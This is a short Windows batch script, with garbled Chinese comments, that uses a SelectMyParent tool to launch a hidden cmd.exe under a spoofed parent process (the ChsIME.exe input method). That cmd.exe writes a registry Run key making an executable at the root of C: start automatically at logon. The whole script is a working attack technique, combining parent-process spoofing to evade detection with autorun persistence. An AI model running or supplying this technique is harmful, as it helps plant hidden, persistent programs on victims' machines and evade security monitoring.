@echo off
@REM "SelectMyParent֧��Unicode"
@REM chcp 65001
cd /d "%~dp0"
@REM "���ó��򸸽���,�������еĳ������������̣���һЩϵͳ����û��Ȩ�޵ġ�"
set parentProcess=ChsIME.exe
@REM "�����ӽ���·��"
set childProcess="c:\windows\system32\cmd.exe /c reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ����_32 /t REG_SZ /d C:\����.exe /f"
@REM set childProcess="c:\windows\system32\notepad.exe"

@REM "�Ƿ���ʾ�ӽ��̴��ڣ�0=���أ�1=��ʾ"
set showWindow=0
for /f "tokens=2 delims=," %%A in ('tasklist /fi "imagename eq %parentProcess%" /nh /fo csv') do (
   SelectMyParent.exe %childProcess% %%A %showWindow%
)
echo errorlevel=%errorlevel%
pause
exit /b